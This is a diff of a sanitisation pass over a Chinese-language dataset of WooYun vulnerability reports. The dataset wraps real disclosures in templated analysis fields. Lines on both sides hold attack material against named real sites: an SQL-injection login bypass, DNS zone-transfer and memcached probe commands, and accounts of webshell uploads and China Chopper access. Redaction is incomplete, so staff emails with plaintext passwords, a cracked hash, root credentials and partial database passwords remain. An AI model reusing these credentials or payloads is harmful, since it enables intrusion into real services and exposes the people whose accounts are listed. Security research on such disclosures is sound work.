-**POC**: http://am.gwbn.net.cn/login.aspxlijie/123456wangyang/123456D座地下机箱至青东商务A座机箱	北京青东商务区	查看	提交安苑北里15号楼光节点箱至17号楼机房	北京环宇视讯科技有限公司	查看	提交安贞里机房	北京市城域网	查看	提交百旺绿谷汽车城东南角杆至广汽丰田	广州丰田传是百旺店	查看	提交柏彦大厦西北角电信井	北京北航科技园建设发展有限公司	查看	提交北京市大山子写字楼	北京腾龙盛事投资顾问有限公司（丽源写字楼	查看	提交北京天安瑞嘉酒店机房至晨光路灯15#井	北京天安瑞嘉商务酒店有限公司	查看	提交北太平路电信杆至玉泉路地铁西北口
+**POC**: https://example.com/[已脱敏]	北京青东商务区	查看	提交安苑北里15号楼光节点箱至17号楼机房	北京环宇视讯科技有限公司	查看	提交安贞里机房	北京市城域网	查看	提交百旺绿谷汽车城东南角杆至广汽丰田	广州丰田传是百旺店	查看	提交柏彦大厦西北角电信井	北京北航科技园建设发展有限公司	查看	提交北京市大山子写字楼	北京腾龙盛事投资顾问有限公司（丽源写字楼	查看	提交北京天安瑞嘉酒店机房至晨光路灯15#井	北京天安瑞嘉商务酒店有限公司	查看	提交北太平路电信杆至玉泉路地铁西北口
 
 **绕过**: 直接利用
 
@@ -14110,7 +14110,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://admin.zdnet.com.cn/global_check/check.php?act=check&key=G61Pb0dPZZbHKePl7Xzw
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -14132,7 +14132,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 117.79.92.149::srvrsync 配置不当。。，没有权限限制多分站点日志文件在这里tougao.csdn.net-access.log130925.gz
+**详情**: [IP已脱敏]::srvrsync 配置不当。。，没有权限限制多分站点日志文件在这里tougao.csdn.net-access.log130925.gz
 
 **POC**: (见原文)
 
@@ -14154,9 +14154,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 访问网址：http://admin.dooland.com/test/news/install.php还有一个文件泄露http://admin.dooland.com/test/news/config.inc.php.bak
+**详情**: 访问网址：https://example.com/[已脱敏]
 
-**POC**: 访问网址：http://admin.dooland.com/test/news/install.php还有一个文件泄露http://admin.dooland.com/test/news/config.inc.php.bak
+**POC**: 访问网址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -14176,7 +14176,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、QQ入手475933286  找到一个人yaokun@huxiu.comyaokun9527@yahoo.com.cnqq 475933286查泄漏：解密MD5：19870617yk这个接口很吊2、批量下mailhuangjinlong@huxiu.com huxiu123hxeditor@huxiu.com huxiu123hxyunying@huxiu.com huxiu123lijia@huxiu.com huxiu123nm@huxiu.com huxiu123numa@huxiu.com huxiu123roobook@huxiu.com huxiu123wuqiong@huxiu.com huxiu123yunying@huxiu.com huxiu123wenzhang@huxiu.com huxiu123456不少  随便登录两证明下：大量的信息3、塔台：4、data后
+**详情**: 1、某互联网公司入手475933286  找到一个人yaokun@huxiu.comyaokun9527@yahoo.com.cn某互联网公司 475933286查泄漏：解密MD5：19870617yk这个接口很吊2、批量下mailhuangjinlong@huxiu.com huxiu123hxeditor@huxiu.com huxiu123hxyunying@huxiu.com huxiu123lijia@huxiu.com huxiu123nm@huxiu.com huxiu123numa@huxiu.com huxiu123roobook@huxiu.com huxiu123wuqiong@huxiu.com huxiu123yunying@huxiu.com huxiu123wenzhang@huxiu.com huxiu123456不少  随便登录两证明下：大量的信息3、塔台：4、data后
 
 **POC**: ···
 
@@ -14198,9 +14198,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: POST /Login.aspx HTTP/1.1Host: newswire.yicai.comProxy-Connection: keep-aliveContent-Length: 338Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://newswire.yicai.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSERContent-Type: application/x-www-fo
+**详情**: POST /Login.aspx HTTP/1.1Host: newswire.yicai.comProxy-Connection: keep-aliveContent-Length: 338Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://example.com/[已脱敏] Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSERContent-Type: application/x-www-fo
 
-**POC**: POST /Login.aspx HTTP/1.1Host: newswire.yicai.comProxy-Connection: keep-aliveContent-Length: 338Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://newswire.yicai.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.3
+**POC**: POST /Login.aspx HTTP/1.1Host: newswire.yicai.comProxy-Connection: keep-aliveContent-Length: 338Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://example.com/[已脱敏] Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.3
 
 **绕过**: 直接利用
 
@@ -14220,7 +14220,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 不少人应该都知道，主站一般都较安全，分站或许就会比较薄弱。但是当DNS配置不当的时候，又会暴露更多薄弱的环节。赛迪网也同样存在这样的问题：这里顺便说下如何测试存在DNS域传输：可以参考drops曾经发布过的：http://drops.wooyun.org/papers/64或者是91ri.org的：http://www.91ri.org/3016.html讲的比较详细。我就直接上图啦
+**详情**: 不少人应该都知道，主站一般都较安全，分站或许就会比较薄弱。但是当DNS配置不当的时候，又会暴露更多薄弱的环节。赛迪网也同样存在这样的问题：这里顺便说下如何测试存在DNS域传输：可以参考drops曾经发布过的：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -14264,7 +14264,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://bugzilla.camera360.com/show_bug.cgi?id=4818https://bugzilla.camera360.com/buglist.cgi?product=%E4%BA%91%E7%9B%B8%E5%86%8C%EF%BC%8D%E7%A7%BB%E5%8A%A8%E7%AB%AF&component=%E4%BA%91%E7%9B%B8%E5%86%8C%E8%AE%BE%E7%BD%AE&resolution=---
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -14286,7 +14286,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: IIS短文件名漏洞http://95555.cmbchina.comhttp://app.cmbchina.comhttp://bank4bank.cmbchina.com......很多二级域名存在此漏洞
+**详情**: IIS短文件名漏洞https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -14308,13 +14308,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 60.12.147.13660.191.223.39不知道是什么系统，但是应该是53KF卖给客户的。
+**详情**: [IP已脱敏]60.191.223.39不知道是什么系统，但是应该是53KF卖给客户的。
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 修复请参照 MongoDB安全配置 http://drops.wooyun.org/tips/2470
+**修复**: 修复请参照 MongoDB安全配置 https://example.com/[已脱敏]
 ---
 
 ---
@@ -14330,9 +14330,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://123.126.34.146:7081/uap/login!login.action然而123.126.34.146  root 123456
+**详情**: http://[IP已脱敏]  root 123456
 
-**POC**: 123.126.34.146  root 123456
+**POC**: [IP已脱敏]  root 123456
 
 **绕过**: 直接利用
 
@@ -14352,7 +14352,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://mail.spc.com.cn/中国石化上海石油化工股份有限公司http://mail.spc.com.cn/test.txt
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -14374,7 +14374,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: #1 分站域名http://chuangxinren.com#2 概述WooYun: 创新工厂我来了，开复·李在哪里？开局篇在上一篇漏洞描述里面，就有提示出 http://chuangxinren.com 这个网站，但是没有一个白帽子去帮助你们测试安全，今天看到了，就顺便提一下吧。#3 问题细节nginx 配置不当，任意文件代码执行漏洞http://chuangxinren.com/robots.txt/a.php
+**详情**: #1 分站域名https://example.com/[已脱敏] 概述WooYun: 创新工厂我来了，开复·李在哪里？开局篇在上一篇漏洞描述里面，就有提示出 https://example.com/[已脱敏] 这个网站，但是没有一个白帽子去帮助你们测试安全，今天看到了，就顺便提一下吧。#3 问题细节nginx 配置不当，任意文件代码执行漏洞https://example.com/[已脱敏]
 
 **POC**: # Discuz论坛，还是可以轻易上传任意文件至服务器的
 
@@ -14396,7 +14396,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 60.191.110.151可下载
+**详情**: [IP已脱敏]可下载
 
 **POC**: 如上所示
 
@@ -14406,8 +14406,8 @@
 ---
 
 ---
-### [wooyun-2011-02265] 腾讯旗下SOSO存在文件名解析漏洞
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
+### [wooyun-2011-02265] 某互联网公司旗下SOSO存在文件名解析漏洞
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 上传功能
 
@@ -14420,7 +14420,7 @@
 
 **详情**: 配置不当，存在解析漏洞，不过外部无法上传文件
 
-**POC**: http://cache.soso.com/30d/img/web/haoqq_logo.png/c.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -14450,8 +14450,8 @@
 ---
 
 ---
-### [wooyun-2011-03262] QQ邮箱枚举任意存在的用户漏洞
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
+### [wooyun-2011-03262] 某互联网公司邮箱枚举任意存在的用户漏洞
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -14462,9 +14462,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: QQ邮箱枚举任意存在的用户漏洞,可以利用此漏洞猜测QQ服务器是否存在某个账号。
+**详情**: 某互联网公司邮箱枚举任意存在的用户漏洞,可以利用此漏洞猜测某互联网公司服务器是否存在某个账号。
 
-**POC**: QQ邮箱枚举任意存在的用户漏洞,可以利用此漏洞猜测QQ服务器是否存在某个账号。
+**POC**: 某互联网公司邮箱枚举任意存在的用户漏洞,可以利用此漏洞猜测某互联网公司服务器是否存在某个账号。
 
 **绕过**: 直接利用
 
@@ -14484,7 +14484,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: phpmyadmin可以直接以 root 用户的身份访问。https://yktj.gov.cn/phpmyadmin/发现这个，什么东西上菜，吃饭再上一道菜已经被人上过了，请自行查杀木马。
+**详情**: phpmyadmin可以直接以 root 用户的身份访问。https://example.com/[已脱敏]
 
 **POC**: 已经证明如上
 
@@ -14506,7 +14506,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://122.224.254.122:8000/Frame/Login.htm直接填写验证码可以进入后台
+**详情**: http://[IP已脱敏]
 
 **POC**: 导致用户信息泄漏
 
@@ -14528,7 +14528,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 还是git配置不当问题  避免重复2个一起发了blog.dnspod.cn/** MySQL database username */define('DB_USER', 'dnspodblog');/** MySQL database password */define('DB_PASSWORD', '789GIU&%4*************^**&GJH');/** MySQL hostname */define('DB_HOST', 'localhost');support.dnspod.cn<?phpreturn array(//'配置项'=>'配置值''DB_DSN' => 'mysql://sptweb:k!e*GchF0*****fY&jSGCWak*****8U@10.66.1.197:1026/swift440','WEB_PATH' => 'https://www.d
+**详情**: 还是git配置不当问题  避免重复2个一起发了blog.dnspod.cn/** MySQL database username */define('DB_USER', 'dnspodblog');/** MySQL database password */define('DB_PASSWORD', '789GIU&%4*************^**&GJH');/** MySQL hostname */define('DB_HOST', 'localhost');support.dnspod.cn<?phpreturn array(//'配置项'=>'配置值''DB_DSN' => 'mysql://sptweb:k!e*GchF0*****fY&jSGCWak*****8U@[IP已脱敏] => 'https://www.d
 
 **POC**: 还是git配置不当问题  避免重复2个一起发了blog.dnspod.cn/** MySQL database username */define('DB_USER', 'dnspodblog');/** MySQL database password */define('DB_PASSWORD', '789GIU&%4*************^**&GJH');/** MySQL hostname */define('DB_HOST', 'localhost');support.dnspod.cn<?phpreturn array(//'配置项'=>'配置值''DB_DSN' => 'my
 
@@ -14538,8 +14538,8 @@
 ---
 
 ---
-### [wooyun-2015-0107268] 中国联通某省域传送漏洞
-**厂商**: 中国联通 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
+### [wooyun-2015-0107268] 某运营商某省域传送漏洞
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -14550,9 +14550,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: dnsenum gzuni.comdnsenum.pl VERSION:1.2.3-----   gzuni.com   -----Host's addresses:__________________Name Servers:______________dns.gzuni.com.                           900      IN    A        211.96.6.2ns2.gzuni.com.                           137      IN    A        58.248.49.142Mail (MX) Servers:___________________mail.gzuni.com.                          8        IN    A        58.248.49.138Tryi
+**详情**: dnsenum gzuni.comdnsenum.pl VERSION:1.2.3-----   gzuni.com   -----Host's addresses:__________________Name Servers:______________dns.gzuni.com.                           900      IN    A        [IP已脱敏]ns2.gzuni.com.                           137      IN    A        [IP已脱敏]Mail (MX) Servers:___________________mail.gzuni.com.                          8        IN    A        [IP已脱敏]Tryi
 
-**POC**: 还有个心脏出血http://gi.gzuni.com 443
+**POC**: 还有个心脏出血https://example.com/[已脱敏] 443
 
 **绕过**: 直接利用
 
@@ -14594,13 +14594,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 42.121.114.246 MongoDB 配置不当
+**详情**: [IP已脱敏] MongoDB 配置不当
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 参考 MongoDB安全配置 http://drops.wooyun.org/tips/2470
+**修复**: 参考 MongoDB安全配置 https://example.com/[已脱敏]
 ---
 
 ---
@@ -14618,7 +14618,7 @@
 
 **详情**: 国家超级计算天津中心官网高危漏洞导致可读取写入任意文件（数据库泄露）
 
-**POC**: http://www.nscc-tj.gov.cn/db/http://www.nscc-tj.gov.cn/kamtiez.txt前人足迹
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -14640,7 +14640,7 @@
 
 **详情**: 
 
-**POC**: dig @123.103.18.8 21tb.com axfr; <<>> DiG 9.9.0 <<>> @123.103.18.8 21tb.com axfr; (1 server found);; global options: +cmd21tb.com.               3600    IN      SOA     21tb-ns1.cneln.net. hezitong.21tb.com. 2014101201 43200 1800 1209600 120021tb.com.               3600    IN      A       123.103.18
+**POC**: dig @[IP已脱敏] 21tb.com axfr; <<>> DiG 9.9.0 <<>> @[IP已脱敏] 21tb.com axfr; (1 server found);; global options: +cmd21tb.com.               3600    IN      SOA     21tb-ns1.cneln.net. hezitong.21tb.com. 2014101201 43200 1800 1209600 120021tb.com.               3600    IN      A       123.103.18
 
 **绕过**: 直接利用
 
@@ -14660,7 +14660,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题地址https://ssl.wahaha.com.cn
+**详情**: 问题地址https://example.com/[已脱敏]
 
 **POC**: 利用Openssl的漏洞，可以成功拿到内存的数据发现这个问题不知道可以不可以拿两瓶娃哈哈....
 
@@ -14682,7 +14682,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://beijing.zznissan.com.cn/admin/console/?c=login&a=log发现可以用户名: admin' or'1'='1 密码:123456 登陆用户名username存在注入.
+**详情**: https://example.com/[已脱敏] admin' or'1'='1 密码:123456 登陆用户名username存在注入.
 
 **POC**: (见原文)
 
@@ -14704,9 +14704,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: IIS5.0的配置。直接put写入漏洞。。。写入一个TXT证明一下。http://58.17.139.94/xb.txt这个就不用图了吧。。。
+**详情**: IIS5.0的配置。直接put写入漏洞。。。写入一个TXT证明一下。http://[IP已脱敏]
 
-**POC**: IIS5.0的配置。直接put写入漏洞。。。写入一个TXT证明一下。http://58.17.139.94/xb.txt这个就不用图了吧。。。
+**POC**: IIS5.0的配置。直接put写入漏洞。。。写入一个TXT证明一下。http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -14714,8 +14714,8 @@
 ---
 
 ---
-### [wooyun-2013-026636] 百度网盘VIP会员一年1毛钱，100G空间一年5毛钱！
-**厂商**: 百度 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
+### [wooyun-2013-026636] 某搜索引擎网盘VIP会员一年1毛钱，100G空间一年5毛钱！
+**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -14736,8 +14736,8 @@
 ---
 
 ---
-### [wooyun-2012-010557] 中国电信某IDC管理服务器沦陷
-**厂商**: 中国电信 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-010557] 某运营商某IDC管理服务器沦陷
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 后台管理
 
@@ -14748,7 +14748,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.中国电信IDC管理服务器后台http://219.153.32.161/2.jboss的后台，沦陷了多少服务器啊http://219.153.32.161/jmx-console
+**详情**: 1.某运营商IDC管理服务器后台http://[IP已脱敏]
 
 **POC**: 3.啥话不说了，菜刀连上4.执行命令也截个图啦5.连接数据库的密码是我今生见过最长最长的，不过还是不保险啊，连上数据库也几个图啦，我以我的人格保证绝对没有脱裤以上纯属测试，所有本人操作的痕迹均已删除，谢绝跨省！！！
 
@@ -14814,9 +14814,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 利用方式：inurl:bbs.tianya.cn/?usernameinurl:bbs.tianya.cn/?passwordhttp://bbs.tianya.cn/m/post-free-4955110-1.shtml?openudid=5E5F256F-6141-4A0D-B7E5-3D7BA2607D3A&device=iphone&userid=5436755&username=poper001&password=c0b799e410766626&username=poper001&password=c0b799e410766626http://bbs.tianya.cn/m/post-free-5105951-1.shtml?openudid=cc50fb8f78e24a9a4876de9b859c35ac3fb6c3e0&device=iphone&userid=550647
+**详情**: 利用方式：inurl:bbs.tianya.cn/?usernameinurl:bbs.tianya.cn/?passwordhttps://example.com/[已脱敏]
 
-**POC**: http://bbs.tianya.cn/m/post-no01-405321-7.shtml?openudid=2730B3C8-3061-49CB-A109-CFCAD3428412&device=iphone&userid=15013133&username=huzuru&password=65cc9a8b95188521http://bbs.tianya.cn/post-333-656516-1.shtml?openudid=2B5F9A46-D0A4-4271-9875-B78CC3D3D82F&device=iphone&userid=7650005&username=khali&
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -14836,18 +14836,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 59.39.71.72 Mongodb 配置不当
+**详情**: [IP已脱敏] Mongodb 配置不当
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 请参考 MongoDB安全配置http://drops.wooyun.org/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/2470
+**修复**: 请参考 MongoDB安全配置https://example.com/[已脱敏]
 ---
 
 ---
 ### [wooyun-2015-095088] 电信某分站配置不当导致敏感文件泄露
-**厂商**: 中国电信 | **年份**: 2015 | **类型**: 应用配置错误
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -14858,7 +14858,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://222.66.139.5/comm/getDownload?segmentPath=WEB-INF/web.xmlhttp://222.66.139.5/comm/getDownload?segmentPath=WEB-INF/struts-config.xml
+**详情**: http://[IP已脱敏]
 
 **POC**: 内含的文件都可下载
 
@@ -14890,8 +14890,8 @@
 ---
 
 ---
-### [wooyun-2014-079111] 新浪某基础服务配置不当
-**厂商**: 新浪 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
+### [wooyun-2014-079111] 某社交平台某基础服务配置不当
+**厂商**: 某社交平台 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 认证接口
 
@@ -14902,7 +14902,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 新浪员工邮件服务配置不当，从 @staff.sina.com.cn 向任何 @staff.sina.com.cn 发信时不需要登录，也没有限制IP。可以直接telnet发信，见图：如果有恶意利用者（向员工发送广告、钓鱼邮件，假冒人员索取机密信息），对严重危害企业信息安全。
+**详情**: 某社交平台员工邮件服务配置不当，从 @staff.sina.com.cn 向任何 @staff.sina.com.cn 发信时不需要登录，也没有限制IP。可以直接telnet发信，见图：如果有恶意利用者（向员工发送广告、钓鱼邮件，假冒人员索取机密信息），对严重危害企业信息安全。
 
 **POC**: (见原文)
 
@@ -14924,7 +14924,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: UC无线营销平台存在严重漏洞，影响非常大！！主要的漏洞有以下两个：1.上传页面权限未验证+存在Fckeditor测试上传页面2.存在ngnix解析漏洞。首先说一句我纯粹是路过的，只是想研究UC广告营销方式，当时恰好看到了UC广告主平台（地址http://ads.uc.cn/），下载了介绍文件大概知道了UC广告的流程。但后来一不小心发现这台服务器上还存在UC无线营销平台（地址http://115.238.228.138:8050/console/），这个平台控制着UC浏览器所有的内显广告。 影响面非常大。如果被不法之徒利用将产生巨大经济损失(介绍文件里写某些广告位甚至达到了一天十万RMB的价格……)过程：1.上传页面，没有权限限制，直接传。2.ngnix解析漏洞，这个已经很出名了，具体方法不写了。3.菜刀下发现权限控制很不严格。4.进入UC营销平台后台，当时看到页面就把我吓坏了……权限无比大
+**详情**: UC无线营销平台存在严重漏洞，影响非常大！！主要的漏洞有以下两个：1.上传页面权限未验证+存在Fckeditor测试上传页面2.存在ngnix解析漏洞。首先说一句我纯粹是路过的，只是想研究UC广告营销方式，当时恰好看到了UC广告主平台（地址https://example.com/[已脱敏] 影响面非常大。如果被不法之徒利用将产生巨大经济损失(介绍文件里写某些广告位甚至达到了一天十万RMB的价格……)过程：1.上传页面，没有权限限制，直接传。2.ngnix解析漏洞，这个已经很出名了，具体方法不写了。3.菜刀下发现权限控制很不严格。4.进入UC营销平台后台，当时看到页面就把我吓坏了……权限无比大
 
 **POC**: 在详细说明里已经贴图了。
 
@@ -15012,7 +15012,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: C:\>nc -vv 61.135.178.118 1121161.135.178.118: inverse host lookup failed: h_errno 11004: NO_DATA(UNKNOWN) [61.135.178.118] 11211 (?) openstats itemsSTAT items:4:number 1544729STAT items:4:age 4772005STAT items:5:number 101088STAT items:5:age 18142497STAT items:6:number 729610STAT items:6:age 1410176STAT items:7:number 1019924STAT items:7:age 2873336STAT items:8:number 1458432STAT items:8:age 1503
+**详情**: C:\>nc -vv [IP已脱敏] 1121161.135.178.118: inverse host lookup failed: h_errno 11004: NO_DATA(UNKNOWN) [[IP已脱敏]] 11211 (?) openstats itemsSTAT items:4:number 1544729STAT items:4:age 4772005STAT items:5:number 101088STAT items:5:age 18142497STAT items:6:number 729610STAT items:6:age 1410176STAT items:7:number 1019924STAT items:7:age 2873336STAT items:8:number 1458432STAT items:8:age 1503
 
 **POC**: (见原文)
 
@@ -15034,9 +15034,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://health.china.com/plus/search.php?keyword=可顺藤摸瓜，从源码知道什么 mysql链接信息啊什么的太晚了，没深入了
+**详情**: https://example.com/[已脱敏] mysql链接信息啊什么的太晚了，没深入了
 
-**POC**: http://health.china.com/plus/search.php?keyword=
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -15058,7 +15058,7 @@
 
 **详情**: 前言 鼓励下爱丽网 很不错的厂商  嘎嘎...
 
-**POC**: 爱丽网分站存在nginx解析漏洞地址：http://product.aili.com/cosmetics/show/ouzuoli/21838.html在评论中 直接上传 php一句话 然后不解释已拿下http://product.aili.com/help.txt亲 要尽快修复哦
+**POC**: 爱丽网分站存在nginx解析漏洞地址：https://example.com/[已脱敏] 直接上传 php一句话 然后不解释已拿下https://example.com/[已脱敏] 要尽快修复哦
 
 **绕过**: 直接利用
 
@@ -15078,7 +15078,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://drops.wooyun.org/papers/1381OpenSSL“心脏出血”漏洞https://vip.btcchina.com
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -15122,7 +15122,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中共上海交通大学纪律检查委员会下载地址：http://jiwei.sjtu.edu.cn/web.rar然后可以查看数据库后台密码就可以破解了可以编辑前台文章了。
+**详情**: 中共上海交通大学纪律检查委员会下载地址：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -15166,7 +15166,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 新人只是为了邀请码http://www.2081234.cn 物联城市房界网大致看了一下是dedecms 版本20140814 比较高后台默认 拿到了账户密码 插入一句话用ip查了下服务所有的网站发现有招聘网站 找到备份的数据库 翻看项目找到后台有三个后台 不一一截图了就不继续深入了贵公司的另一个服务器木马太多 请自行清理
+**详情**: 新人只是为了邀请码https://example.com/[已脱敏] 物联城市房界网大致看了一下是dedecms 版本20140814 比较高后台默认 拿到了账户密码 插入一句话用ip查了下服务所有的网站发现有招聘网站 找到备份的数据库 翻看项目找到后台有三个后台 不一一截图了就不继续深入了贵公司的另一个服务器木马太多 请自行清理
 
 **POC**: (见原文)
 
@@ -15188,7 +15188,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://i.yeepay.com/shtml/mobile_01.jsp.bak
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -15264,8 +15264,8 @@
 ---
 
 ---
-### [wooyun-2012-011788] 百度某j2ee应用配置失误导致文件读取！
-**厂商**: 百度 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-011788] 某搜索引擎某j2ee应用配置失误导致文件读取！
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -15298,9 +15298,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1URL：湖北省交通运输厅：http://www.hbjt.gov.cn黑龙江省公安厅交通警察总队.龙江交警网：http://www.hljjj.gov.cn四川省交通运输厅:http://www.scjt.gov.cn/厦门市交通运输局:http://www.xmcp.gov.cn/盐城市交通运输局:www.ycjtj.gov.cn
+**详情**: 1URL：湖北省交通运输厅：https://example.com/[已脱敏]
 
-**POC**: 2.泄露信息：湖北省交通运输厅：http://www.hbjt.gov.cn; <<>> DiG 9.8.3-P1 <<>> @ns1.hbjt.gov.cn. axfr hbjt.gov.cn; (2 servers found);; global options: +cmdhbjt.gov.cn.		43200	IN	SOA	ns1.hbjt.gov.cn. root.hbjt.gov.cn. 47 900 600 604800 86400hbjt.gov.cn.		43200	IN	NS	ns1.hbjt.gov.cn.hbjt.gov.cn.		43200	IN	MX	10 mail.
+**POC**: 2.泄露信息：湖北省交通运输厅：https://example.com/[已脱敏] <<>> DiG 9.8.3-P1 <<>> @ns1.hbjt.gov.cn. axfr hbjt.gov.cn; (2 servers found);; global options: +cmdhbjt.gov.cn.		43200	IN	SOA	ns1.hbjt.gov.cn. root.hbjt.gov.cn. 47 900 600 604800 86400hbjt.gov.cn.		43200	IN	NS	ns1.hbjt.gov.cn.hbjt.gov.cn.		43200	IN	MX	10 mail.
 
 **绕过**: 直接利用
 
@@ -15364,7 +15364,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 他发了个z.wuyun.com  我以为是wooyun的某个站点并且没有百度CDN 所以就C段扫描来着...没想到挖到个大鱼...首先是小的泄漏  包括华为员工的姓名电话邮箱职位住址信息泄漏源是华为的内部APPhttp://w3m.huawei.com/m/servlet/indexiPhone的我没看 但是Android的我就全部翻了下 问题不少 很多APP内有测试文件没有即时删除 导致测试信息泄漏了下面就是http://205.177.226.128:8080/asynchPeople/ 站点允许匿名访问 导致大量信息泄漏包括一些源码 密码mysql的密码什么  (mysql连不上1129了 这个不关我的事....)下面就看图不说话了...
+**详情**: 他发了个z.wuyun.com  我以为是wooyun的某个站点并且没有某搜索引擎CDN 所以就C段扫描来着...没想到挖到个大鱼...首先是小的泄漏  包括华为员工的姓名电话邮箱职位住址信息泄漏源是华为的内部APPhttps://example.com/[已脱敏] 但是Android的我就全部翻了下 问题不少 很多APP内有测试文件没有即时删除 导致测试信息泄漏了下面就是http://[IP已脱敏] 站点允许匿名访问 导致大量信息泄漏包括一些源码 密码mysql的密码什么  (mysql连不上1129了 这个不关我的事....)下面就看图不说话了...
 
 **POC**: 如上
 
@@ -15386,7 +15386,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 发现后台http://www.easytransfer.cn:8003，可惜未爆破支付页面http://www.easytransfer.cn:8004发现Mongodb配置不当可访问，泄露用户名各种信息103.31.200.210
+**详情**: 发现后台https://example.com/[已脱敏]
 
